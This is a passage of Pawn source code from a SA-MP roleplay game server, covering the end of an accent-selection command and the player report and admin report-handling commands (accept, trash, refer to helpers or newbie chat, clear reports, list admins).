			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Asian accent, use /accent to change it.");
		}
	case 4:
		{
			PlayerInfo[playerid][pAccent] = 4;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Scottish accent, use /accent to change it.");
		}
	case 5:
		{
			PlayerInfo[playerid][pAccent] = 5;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Irish accent, use /accent to change it.");
		}
	case 6:
		{
			PlayerInfo[playerid][pAccent] = 6;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Russian accent, use /accent to change it.");
		}
	case 7:
		{
			PlayerInfo[playerid][pAccent] = 7;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the American accent, use /accent to change it.");
		}
	case 8:
		{
			PlayerInfo[playerid][pAccent] = 8;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Spanish accent, use /accent to change it.");
		}
	case 9:
		{
			PlayerInfo[playerid][pAccent] = 9;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Southern accent, use /accent to change it.");
		}
	case 10:
		{
			PlayerInfo[playerid][pAccent] = 10;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Cuban accent, use /accent to change it.");
		}
	case 11:
		{
			PlayerInfo[playerid][pAccent] = 11;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Italian accent, use /accent to change it.");
		}
	case 12:
		{
			PlayerInfo[playerid][pAccent] = 12;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Gangster accent, use /accent to change it.");
		}
	case 13:
		{
			PlayerInfo[playerid][pAccent] = 13;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Australian accent, use /accent to change it.");
		}
	case 14:
		{
			PlayerInfo[playerid][pAccent] = 14;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Arabic accent, use /accent to change it.");
		}
	case 15:
		{
			PlayerInfo[playerid][pAccent] = 15;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Balkan accent, use /accent to change it.");
		}
	case 16:
		{
			PlayerInfo[playerid][pAccent] = 16;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Canadian accent, use /accent to change it.");
		}
	case 17:
		{
			PlayerInfo[playerid][pAccent] = 17;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Jamaican accent, use /accent to change it.");
		}
	case 18:
		{
			PlayerInfo[playerid][pAccent] = 18;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Israeli accent, use /accent to change it.");
		}
 	case 19:
		{
			PlayerInfo[playerid][pAccent] = 19;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Indian accent, use /accent to change it.");
		}
 	case 20:
		{
			PlayerInfo[playerid][pAccent] = 20;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Welsh accent, use /accent to change it.");
		}
 	case 21:
		{
			PlayerInfo[playerid][pAccent] = 21;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the French accent, use /accent to change it.");
		}
 	case 22:
		{
			PlayerInfo[playerid][pAccent] = 22;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the German accent, use /accent to change it.");
		}
 	case 23:
		{
			PlayerInfo[playerid][pAccent] = 23;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Dutch accent, use /accent to change it.");
		}
 	case 24:
		{
			PlayerInfo[playerid][pAccent] = 24;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the South African accent, use /accent to change it.");
		}
 	case 25:
		{
			PlayerInfo[playerid][pAccent] = 25;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the No Accent, use /accent to change it.");
		}
	}
	return 1;
}

CMD:reply(playerid, params[])
{
	new string[128];
	new reportid = INVALID_REPORT_ID;
	for(new i = 0; i < MAX_REPORTS; i++)
	{
		if(Reports[i][ReportFrom] == playerid && Reports[i][CheckingReport] != 999)
		{
			reportid = i;
		}
	}
	if(reportid == INVALID_REPORT_ID)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You don't have any reports being reviewed at the moment.");
		return 1;
	}
	if(IsPlayerConnected(Reports[reportid][CheckingReport]))
	{
		format(string, sizeof(string), "%s(ID: %d) replies: %s", GetPlayerNameEx(playerid), playerid, params);
		SendClientMessage(Reports[reportid][CheckingReport], COLOR_YELLOW, string);

		format(string, sizeof(string), "Reply sent to %s: %s", GetPlayerNameEx(Reports[reportid][CheckingReport]), params);
		SendClientMessage(playerid,  COLOR_YELLOW, string);
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Player not connected.");
	return 1;
}

CMD:reporttips(playerid, params[])
{
	ShowPlayerDialogEx(playerid,7955,DIALOG_STYLE_MSGBOX,"Report tips","Tips when reporting:\n- Report what you need, not who you need.\n- Be specific, report exactly what you need.\n- Do not make false reports.\n- Report only for in-game items.","Close", "");
	return 1;
}

CMD:reportbug(playerid, params[])
{
	if(!IsBETAServer())
	    return SendClientMessage(playerid, COLOR_GREY, "This isn't on the beta server!");

	if(AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin] < 6)
		return SendClientMessage(playerid, COLOR_GRAD2, "You can't submit reports while on-duty.");

	if(PlayerInfo[playerid][pRMuted] != 0)
		return ShowPlayerDialogEx(playerid,7955,DIALOG_STYLE_MSGBOX,"Report tips","Tips when reporting bugs:\n- Be specific, describe the bug.\n- Do not make false bug reports.","Close", "");

	if(JustReported[playerid] > 0)
		return SendClientMessage(playerid, COLOR_GREY, "Wait 10 seconds before sending another bug report!");

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /reportbug [text]");

	JustReported[playerid] = 10;
	SendBugReportToQueue(playerid, params);
	SendClientMessage(playerid, COLOR_YELLOW, "Your report message was sent to the developers.");
	return 1;
}

CMD:bugs(playerid, params[])
{
	if(!IsBETAServer())
	    return SendClientMessage(playerid, COLOR_GREY, "This isn't on the beta server!");

	if(PlayerInfo[playerid][pAdmin] >= 1) {
		new string[128];
		SendClientMessage(playerid, COLOR_GREEN, "____________________ BUGS _____________________");
		for(new i = 0; i < MAX_REPORTS; i++)
		{
			if(Reports[i][BeingUsed] == 1 && Reports[i][BugReport] == 1)
			{
				format(string, sizeof(string), "%s(ID: %i) | BID: %i | Report: %s", GetPlayerNameEx(Reports[i][ReportFrom]), Reports[i][ReportFrom], i, (Reports[i][Report]));
				SendClientMessage(playerid, COLOR_REPORT, string);
			}
		}
		SendClientMessage(playerid, COLOR_GREEN, "___________________________________________________");
	}
	return 1;
}

CMD:report(playerid, params[])
{
	if(AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin] < 6)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You can't submit reports while on-duty.");
		return 1;
	}
	if(PlayerInfo[playerid][pRMuted] != 0)
	{
		ShowPlayerDialogEx(playerid,7955,DIALOG_STYLE_MSGBOX,"Report tips","Tips when reporting:\n- Report what you need, not who you need.\n- Be specific, report exactly what you need.\n- Do not make false reports.\n- Report only for in-game items.","Close", "");
		return 1;
	}
	if(JustReported[playerid] > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Wait 25 seconds before sending another report!");
		return 1;
	}

	if(isnull(params)) return SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /report [text]");

	JustReported[playerid]=25;
	SendReportToQueue(playerid, params);
	SendClientMessage(playerid, COLOR_YELLOW, "Your report message was sent to the Admins.");
	return 1;
}

CMD:reports(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1) {
		new string[128];
		SendClientMessage(playerid, COLOR_GREEN, "____________________ REPORTS _____________________");
		for(new i = 0; i < MAX_REPORTS; i++)
		{
			if(Reports[i][BeingUsed] == 1 && Reports[i][BugReport] == 0)
			{
				format(string, sizeof(string), "%s(ID: %i) | RID: %i | Report: %s | Expires in: %d minutes.", GetPlayerNameEx(Reports[i][ReportFrom]), Reports[i][ReportFrom], i, (Reports[i][Report]), Reports[i][TimeToExpire]);
				SendClientMessage(playerid, COLOR_REPORT, string);
			}
		}
		SendClientMessage(playerid, COLOR_GREEN, "___________________________________________________");
	}
	return 1;
}

CMD:ar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new string[128], reportid;
		if(sscanf(params, "d", reportid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /ar [reportid]");
		if(Reports[reportid][BugReport] == 1 && PlayerInfo[playerid][pAdmin] < 6 && IsBETAServer())
			return SendClientMessage(playerid,COLOR_WHITE, "This type of report can only be accepted by beta testers and developers.");
		if(reportid < 0 || reportid > 999) { SendClientMessage(playerid, COLOR_GREY, "   Report ID not below 0 or above 999!"); return 1; }
		if(Reports[reportid][BeingUsed] == 0) {
			SendClientMessage(playerid, COLOR_GREY, "   That report ID is not being used!");
			return 1;
		}
		if(!IsPlayerConnected(Reports[reportid][ReportFrom])) {
			SendClientMessage(playerid, COLOR_GREY, "   The reporter has disconnected!");
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			return 1;
		}
		format(string, sizeof(string), "AdmCmd: %s has accepted the report from %s (ID: %i, RID: %i).", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]),Reports[reportid][ReportFrom],reportid);
		ABroadCast(COLOR_ORANGE, string, 1);
		AddReportToken(playerid); // Report Tokens
		format(string, sizeof(string), "%s has accepted your report and is reviewing it, you can /reply to send messages to the admin reviewing your report.", GetPlayerNameEx(playerid));
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
		PlayerInfo[playerid][pAcceptReport]++;
		Reports[reportid][ReplyTimerr] = SetTimerEx("ReplyTimer", 60000, 0, "d", reportid);
		Reports[reportid][CheckingReport] = playerid;
		Reports[reportid][BeingUsed] = 0;
		Reports[reportid][TimeToExpire] = 0;
		strmid(Reports[reportid][Report], "None", 0, 4, 4);
	}
	return 1;
}

CMD:tr(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1) {
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new
			string[128],
			reportid;

		if(sscanf(params, "d", reportid))
			return SendClientMessage(playerid, COLOR_WHITE,"USAGE: /tr [reportid]");

		if(Reports[reportid][BugReport] == 1 && PlayerInfo[playerid][pAdmin] < 6 && IsBETAServer())
			return SendClientMessage(playerid,COLOR_WHITE, "This type of report can only be accepted by beta testers and developers.");

		if(reportid < 0 || reportid > 999) { SendClientMessage(playerid, COLOR_GREY, "   Report ID not below 0 or above 999!"); return 1; }
		if(Reports[reportid][BeingUsed] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   That report ID is not being used!");
			return 1;
		}
		if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
		{
			SendClientMessage(playerid, COLOR_GREY, "   The reporter has disconnected!");
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			return 1;
		}
		format(string, sizeof(string), "AdmCmd: %s has trashed the report from %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]));
		ABroadCast(COLOR_ORANGE, string, 1);
		format(string, sizeof(string), "%s has marked your report invalid. It will not be reviewed. Please check /reporttips", GetPlayerNameEx(playerid));
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
		PlayerInfo[playerid][pTrashReport]++;
		Reports[reportid][ReportFrom] = 999;
		Reports[reportid][BeingUsed] = 0;
		Reports[reportid][TimeToExpire] = 0;
		strmid(Reports[reportid][Report], "None", 0, 4, 4);
	}
	return 1;
}

CMD:listpnamechanges(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 3)
	    return SendClientMessage(playerid, COLOR_GREY, "You're not authorised to use this command.");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	new
	    iTarget;

	if(sscanf(params, "u", iTarget))
	    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /listnchanges [playerid/partOfName]");

	if(iTarget == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

	new
	    szQuery[114];

	SetPVarInt(playerid, "namechanges_target", iTarget);

	mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT oldname, unixts, newname, approvedbyname FROM namechanges WHERE dbid = %d ORDER BY unixts DESC LIMIT 10", PlayerInfo[iTarget][pID]);
	mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_LIST_NAMECHANGES,playerid);
	return 1;
}

CMD:sth(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
		    return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		if(isnull(params))
			return SendClientMessage(playerid, COLOR_WHITE,"USAGE: /sth [reportid]");

		new
			iReportID = strval(params);

		if(iReportID < 0 || iReportID > 999)
			return SendClientMessage(playerid, COLOR_GREY, "   Report ID not below 0 or above 999!");

		if(Reports[iReportID][BeingUsed] == 0)
			return SendClientMessage(playerid, COLOR_GREY, "   That report ID is not being used!");

		if(!IsPlayerConnected(Reports[iReportID][ReportFrom]))
		{
			SendClientMessage(playerid, COLOR_GREY, "   The reporter has disconnected!");
			Reports[iReportID][ReportFrom] = 999;
			Reports[iReportID][BeingUsed] = 0;
			return 1;
		}

		SendClientMessage(Reports[iReportID][ReportFrom], COLOR_WHITE, "An admin has referred your report to senior helpers. You can do this by /requesthelp.");
		SendClientMessage(Reports[iReportID][ReportFrom], COLOR_WHITE, "Senior helpers and other various people will help you with your question there.");

		if(gNewbie[Reports[iReportID][ReportFrom]] != 0)
			gNewbie[Reports[iReportID][ReportFrom]] = 0;


	    SetPVarString(Reports[iReportID][ReportFrom], "helpreq", Reports[iReportID][Report]);

	    new
	        szMessage[128];

	    format(szMessage, sizeof(szMessage), "HelpCmd: %s (%d) has just sent a request for help; %s", GetPlayerNameEx(Reports[iReportID][ReportFrom]), Reports[iReportID][ReportFrom], Reports[iReportID][Report]);
	    HelperBroadcast(COLOR_LIGHTBLUE, szMessage, 1);

		format(szMessage, sizeof(szMessage), "AdmCmd: %s has referred %s's (RID: %d) report to senior helpers.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[iReportID][ReportFrom]), iReportID);
		ABroadCast(COLOR_ORANGE, szMessage, 1);

		Reports[iReportID][ReportFrom] = 999;
		Reports[iReportID][BeingUsed] = 0;
		Reports[iReportID][TimeToExpire] = 0;
		strmid(Reports[iReportID][Report], "None", 0, 4, 4);
	}
	return 1;
}

CMD:rtnc(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1) {
		if(PlayerInfo[playerid][pHelper] >= 1) {
		    new
		        iTarget,
				szMessage[128],
				szHelp[128];

	    	if(sscanf(params, "u", iTarget))
	        	return SendClientMessage(playerid, COLOR_WHITE,"USAGE: /rtnc [playerid/partofname]");

	        if(iTarget == INVALID_PLAYER_ID)
	            return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

			if(GetPVarType(iTarget, "helpreq") == 0)
			    return SendClientMessage(playerid, COLOR_GREY, "The specified player hasn't created a help request.");

			SendClientMessage(iTarget, COLOR_WHITE, "A helper has referred your report to newbie chat. Use /newb to respond.");
			SendClientMessage(iTarget, COLOR_WHITE, "Players, admins and other various people will help you with your question here.");

			if(gNewbie[iTarget] != 0)
				gNewbie[iTarget] = 0;

			GetPVarString(playerid, "helpreq", szHelp, sizeof(szHelp));

			format(szMessage, sizeof(szMessage), "** Newbie %s: %s", GetPlayerNameEx(iTarget), szHelp);
			foreach(Player, n) {
				if(gNewbie[n]==0) {
					SendClientMessage(n, COLOR_NEWBIE, szMessage);
				}
			}

			format(szMessage, sizeof(szMessage), "HelpCmd: %s has referred %s's (ID: %d) request to newbie chat.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTarget), iTarget);
			HelperBroadcast(COLOR_ORANGE, szMessage, 1);
		} else {
	 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
		        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		    if(isnull(params))
		        return SendClientMessage(playerid, COLOR_WHITE,"USAGE: /rtnc [reportid]");

		    new
		        iReportID = strval(params);

			if(iReportID < 0 || iReportID > 999) { SendClientMessage(playerid, COLOR_GREY, "   Report ID not below 0 or above 999!"); return 1; }
			if(Reports[iReportID][BeingUsed] == 0)
			{
				SendClientMessage(playerid, COLOR_GREY, "   That report ID is not being used!");
				return 1;
			}
			if(!IsPlayerConnected(Reports[iReportID][ReportFrom]))
			{
				SendClientMessage(playerid, COLOR_GREY, "   The reporter has disconnected!");
				Reports[iReportID][ReportFrom] = 999;
				Reports[iReportID][BeingUsed] = 0;
				return 1;
			}

			SendClientMessage(Reports[iReportID][ReportFrom], COLOR_WHITE, "An admin has referred your report to newbie chat. Use /newb to respond.");
			SendClientMessage(Reports[iReportID][ReportFrom], COLOR_WHITE, "Players, helpers and other various people will help you with your question here.");

			if(gNewbie[Reports[iReportID][ReportFrom]] != 0)
				gNewbie[Reports[iReportID][ReportFrom]] = 0;

			new
			    szMessage[128];

			format(szMessage, sizeof(szMessage), "** Newbie %s: %s", GetPlayerNameEx(Reports[iReportID][ReportFrom]), Reports[iReportID][Report]);
			foreach(Player, n) {
				if(gNewbie[n]==0) {
					SendClientMessage(n, COLOR_NEWBIE, szMessage);
				}
			}

			format(szMessage, sizeof(szMessage), "AdmCmd: %s has referred %s's (RID: %d) report to newbie chat.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[iReportID][ReportFrom]), iReportID);
			ABroadCast(COLOR_ORANGE, szMessage, 1);

			Reports[iReportID][ReportFrom] = 999;
			Reports[iReportID][BeingUsed] = 0;
			Reports[iReportID][TimeToExpire] = 0;
			strmid(Reports[iReportID][Report], "None", 0, 4, 4);
		}
	}

	return 1;
}

CMD:nro(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new string[128], reportid;
		if(sscanf(params, "d", reportid)) return SendClientMessage(playerid, COLOR_WHITE,"USAGE: /nro [reportid]");
		if(Reports[reportid][BugReport] == 1 && PlayerInfo[playerid][pAdmin] < 6 && IsBETAServer())
			return SendClientMessage(playerid,COLOR_WHITE, "This type of report can only be accepted by beta testers and developers.");
		if(reportid < 0 || reportid > 999) { SendClientMessage(playerid, COLOR_GREY, "   Report ID not below 0 or above 999!"); return 1; }
		if(Reports[reportid][BeingUsed] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   That report ID is not being used!");
			return 1;
		}
		if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
		{
			SendClientMessage(playerid, COLOR_GREY, "   The reporter has disconnected!");
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			return 1;
		}
		format(string, sizeof(string), "AdmCmd: %s has cleared report from %s (RID: %d) as it isn't a rule breaking offense that was reported.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]), reportid);
		ABroadCast(COLOR_ORANGE, string, 1);
		format(string, sizeof(string), "%s has reviewed your report and determined this report is not valid. The player you reported is not breaking any rules.", GetPlayerNameEx(playerid));
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, "If you feel this is a rule-breaking offense, you can always propose we create this as a new rule by posting on the forums.");
		Reports[reportid][ReportFrom] = 999;
		Reports[reportid][BeingUsed] = 0;
		Reports[reportid][TimeToExpire] = 0;
		strmid(Reports[reportid][Report], "None", 0, 4, 4);
	}
	return 1;
}

CMD:post(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new string[128], reportid;
		if(sscanf(params, "d", reportid)) return SendClientMessage(playerid, COLOR_WHITE,"USAGE: /post [reportid]");
		if(Reports[reportid][BugReport] == 1 && PlayerInfo[playerid][pAdmin] < 6 && IsBETAServer())
			return SendClientMessage(playerid,COLOR_WHITE, "This type of report can only be accepted by beta testers and developers.");
		if(reportid < 0 || reportid > 999) { SendClientMessage(playerid, COLOR_GREY, "   Report ID not below 0 or above 999!"); return 1; }
		if(Reports[reportid][BeingUsed] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   That report ID is not being used!");
			return 1;
		}
		if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
		{
			SendClientMessage(playerid, COLOR_GREY, "   The reporter has disconnected!");
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			return 1;
		}
		format(string, sizeof(string), "AdmCmd: %s has cleared report from %s (RID: %d) due to it needing to be handled on the forums", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]), reportid);
		ABroadCast(COLOR_ORANGE, string, 1);
		format(string, sizeof(string), "%s has reviewed your report and determined this report should be handled on the forums (i.e. complaint or request.)", GetPlayerNameEx(playerid));
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, "Please only report for items that are actively occuring in game. ("WEBSITE")");
		Reports[reportid][ReportFrom] = 999;
		Reports[reportid][BeingUsed] = 0;
		Reports[reportid][TimeToExpire] = 0;
		strmid(Reports[reportid][Report], "None", 0, 4, 4);
	}
	return 1;
}

CMD:norevive(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new string[128], reportid;
		if(sscanf(params, "d", reportid)) return SendClientMessage(playerid, COLOR_WHITE,"USAGE: /norevive [reportid]");
		if(Reports[reportid][BugReport] == 1 && PlayerInfo[playerid][pAdmin] < 6 && IsBETAServer())
			return SendClientMessage(playerid,COLOR_WHITE, "This type of report can only be accepted by beta testers and developers.");
		if(reportid < 0 || reportid > 999) { SendClientMessage(playerid, COLOR_GREY, "   Report ID not below 0 or above 999!"); return 1; }
		if(Reports[reportid][BeingUsed] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   That report ID is not being used!");
			return 1;
		}
		if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
		{
			SendClientMessage(playerid, COLOR_GREY, "   The reporter has disconnected!");
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			return 1;
		}
		format(string, sizeof(string), "AdmCmd: %s has cleared report from %s (RID: %d) because their request for a revive was not valid.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]), reportid);
		ABroadCast(COLOR_ORANGE, string, 1);
		format(string, sizeof(string), "%s has reviewed your report and determined that you may not be revived.", GetPlayerNameEx(playerid));
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, "If you died due to a bug or were DMed (and an admin witnessed it), you're only then entitled to a revive.");
		Reports[reportid][ReportFrom] = 999;
		Reports[reportid][BeingUsed] = 0;
		Reports[reportid][TimeToExpire] = 0;
		strmid(Reports[reportid][Report], "None", 0, 4, 4);
	}
	return 1;
}

CMD:nao(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new string[128], reportid;
		if(sscanf(params, "d", reportid)) return SendClientMessage(playerid, COLOR_WHITE,"USAGE: /nao [reportid]");
		if(Reports[reportid][BugReport] == 1 && PlayerInfo[playerid][pAdmin] < 6 && IsBETAServer())
			return SendClientMessage(playerid,COLOR_WHITE, "This type of report can only be accepted by beta testers and developers.");
		if(reportid < 0 || reportid > 999) { SendClientMessage(playerid, COLOR_GREY, "   Report ID not below 0 or above 999!"); return 1; }
		if(Reports[reportid][BeingUsed] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   That report ID is not being used!");
			return 1;
		}
		if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
		{
			SendClientMessage(playerid, COLOR_GREY, "   The reporter has disconnected!");
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			return 1;
		}
		format(string, sizeof(string), "AdmCmd: %s has cleared report from %s (RID: %d) due to not having admin of sufficient authority online.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]), reportid);
		ABroadCast(COLOR_ORANGE, string, 1);
		format(string, sizeof(string), "%s has reviewed your report and there is no Admin online with sufficient authority to handle your request.", GetPlayerNameEx(playerid));
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, "You can post a request on the forums for additional assistance ("WEBSITE"). Our apologies for the inconvenience. ");
		Reports[reportid][ReportFrom] = 999;
		Reports[reportid][BeingUsed] = 0;
		Reports[reportid][TimeToExpire] = 0;
		strmid(Reports[reportid][Report], "None", 0, 4, 4);
	}
	return 1;
}

CMD:clearallreports(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 5) {
  		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
        new string[128];
        ClearReports();
        SendClientMessage(playerid,COLOR_GRAD1, "You have cleared all the active reports.");
        format(string, sizeof(string), "AdmCmd: %s has cleared all the pending reports.", GetPlayerNameEx(playerid));
        ABroadCast(COLOR_LIGHTRED, string, 1);
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
    }
    return 1;
}

CMD:admins(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 1)
	{
        SendClientMessage(playerid, COLOR_NEWS, "Admins Online:");
        foreach(Player, i)
		{
            if(PlayerInfo[i][pAdmin] >= 1 && PlayerInfo[i][pAdmin] <= PlayerInfo[playerid][pAdmin])
			{
				new string[128], strFromFile[128], sstring[128], rtoken;
	 			new playern[MAX_PLAYER_NAME];
  				new month, day, year;
  		 		GetPlayerName(i, playern, sizeof(playern));
  		 		getdate(year, month, day);

                if(PlayerInfo[playerid][pAdmin] >= 5)
				{
					if(AdminDuty[i] == 1)
					{
                		format(sstring,sizeof(sstring),"admins/rtokens/%s[%d'%d'%d]",playern,month,day,year);
                		if(fexist(sstring))
						{
                			new File: file = fopen(sstring, io_read);
                    		if(file)
							{
                    	    fread(file, strFromFile);
                        	fclose(file);
                        	rtoken = strval(strFromFile);
                    		}
                		}

                        format(string, sizeof(string), "(Level %d Admin: %s) - (On-duty) - (Reports Today: %d)", PlayerInfo[i][pAdmin], GetPlayerNameEx(i), rtoken);
					}
					else
					{
   						format(sstring,sizeof(sstring),"admins/rtokens/%s[%d'%d'%d]",PlayerInfo[i][pAdminName],month,day,year);
                		if(fexist(sstring))
						{
                			new File: file = fopen(sstring, io_read);
                    		if(file)
							{
                    	    fread(file, strFromFile);
                        	fclose(file);
                        	rtoken = strval(strFromFile);
                    		}
                		}

   						if(strlen(PlayerInfo[i][pAdminName]) > 2 && strlen(PlayerInfo[i][pAdminName]) < 20)
						{
							format(string, sizeof(string), "(Level %d Admin: %s) - (Off-duty) - (ID %d - %s) - (Reports Today: %d)", PlayerInfo[i][pAdmin], PlayerInfo[i][pAdminName], i, GetPlayerNameEx(i), rtoken);
						}
						else
						{
							format(string, sizeof(string), "(Level %d Admin: No admin name set) - (Off-duty) - (ID %d - %s) - (Reports Today: %d)", PlayerInfo[i][pAdmin], i, GetPlayerNameEx(i), rtoken);
						}
					}
                }
                else
				{
					if(AdminDuty[i] == 1)
					{
						format(string, sizeof(string), "(Level %d Admin: %s) - (On-duty)", PlayerInfo[i][pAdmin], GetPlayerNameEx(i));
					}
					else
					{
 						if(strlen(PlayerInfo[i][pAdminName]) > 2 && strlen(PlayerInfo[i][pAdminName]) < 20)
						{
							format(string, sizeof(string), "(Level %d Admin: %s) - (Off-duty) - (ID %d - %s)", PlayerInfo[i][pAdmin], PlayerInfo[i][pAdminName], i, GetPlayerNameEx(i));
						}
						else
						{
